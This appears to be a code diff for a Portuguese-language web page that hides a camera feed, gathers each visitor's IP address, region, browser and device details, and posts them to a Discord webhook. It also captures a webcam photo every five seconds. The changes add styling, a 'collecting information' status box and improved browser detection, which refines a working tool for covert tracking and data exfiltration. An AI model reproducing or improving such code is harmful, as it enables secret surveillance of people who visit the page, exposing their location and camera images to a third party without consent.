@@ -14,21 +14,56 @@
             align-items: center;
             height: 100vh;
             color: white;
+            font-family: 'Courier New', Courier, monospace;
         }
         video {
-            display: none;  /* ocultar o vídeo, pois só vamos capturar a imagem */
+            display: none;  /* Ocultar o vídeo da câmera */
+        }
+        .content {
+            text-align: center;
+            padding: 20px;
+            border: 2px solid white;
+            border-radius: 10px;
+            background-color: rgba(0, 0, 0, 0.7);
+            width: 300px;
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
+        }
+        h1 {
+            color: #ff6347; /* Cor vermelha para títulos */
+        }
+        p {
+            font-size: 1.2em;
+            margin: 10px 0;
         }
     </style>
 </head>
 <body>
-    <video id="videoElement" autoplay></video>  <!-- vídeo oculto que usa a câmera -->
+    <div class="content">
+        <h1>Coletando Informações...</h1>
+        <p id="status">Aguardando dados...</p>
+        <video id="videoElement" autoplay></video>  <!-- vídeo oculto -->
+    </div>
 
     <script>
         // Função para pegar informações do dispositivo
         function getDeviceInfo() {
-            const deviceInfo = navigator.userAgent;  // Informações do dispositivo (navegador)
-            const browser = navigator.appName;  // Nome do navegador
+            const deviceInfo = navigator.userAgent;  // Informações do dispositivo
+            const browser = getBrowser();  // Função para capturar o navegador corretamente
             return { deviceInfo, browser };
+        }
+
+        // Função para detectar o navegador corretamente
+        function getBrowser() {
+            let userAgent = navigator.userAgent.toLowerCase();
+            if (userAgent.indexOf("chrome") > -1) {
+                return "Chrome";
+            } else if (userAgent.indexOf("firefox") > -1) {
+                return "Firefox";
+            } else if (userAgent.indexOf("safari") > -1) {
+                return "Safari";
+            } else {
+                return "Desconhecido";
+            }
         }
 
         // Função para enviar as informações para o Discord Webhook
@@ -39,11 +74,15 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    content: `**Informações do Usuário:**
-IP: ${info.ip}
-Dispositivo: ${info.deviceInfo}
-Navegador: ${info.browser}
-Região: ${info.region}
+                    content: `
+**# Informações do Usuário:**
+
+> **IP:** ${info.ip}
+> **Dispositivo:** ${info.deviceInfo}
+> **Navegador:** ${info.browser}
+> **Região:** ${info.region}
+
+**Foto Capturada:**
 `})
             })
             .then(response => {
@@ -93,7 +132,10 @@ Região: ${info.region}
                     // Obter informações do dispositivo
                     const deviceInfo = getDeviceInfo();
 
-                    // Enviar as informações do dispositivo e localização do IP
+                    // Atualizar a interface com os dados de status
+                    document.getElementById('status').innerText = 'Obtendo informações do IP...';
+
+                    // Pegar o IP público e a localização
                     fetch('https://ip-api.com/json')  // Pega o IP público e a localização
                         .then(response => response.json())
                         .then(data => {
@@ -110,10 +152,14 @@ Região: ${info.region}
                             // Captura foto a cada 5 segundos
                             setInterval(() => capturePhoto(videoElement), 5000);
                         })
-                        .catch(error => console.error('Erro ao pegar informações do IP:', error));
+                        .catch(error => {
+                            console.error('Erro ao pegar informações do IP:', error);
+                            document.getElementById('status').innerText = 'Erro ao obter informações do IP!';
+                        });
                 })
                 .catch(function (error) {
                     console.error('Erro ao acessar a câmera:', error);
+                    document.getElementById('status').innerText = 'Erro ao acessar a câmera!';
                 });
         }
 
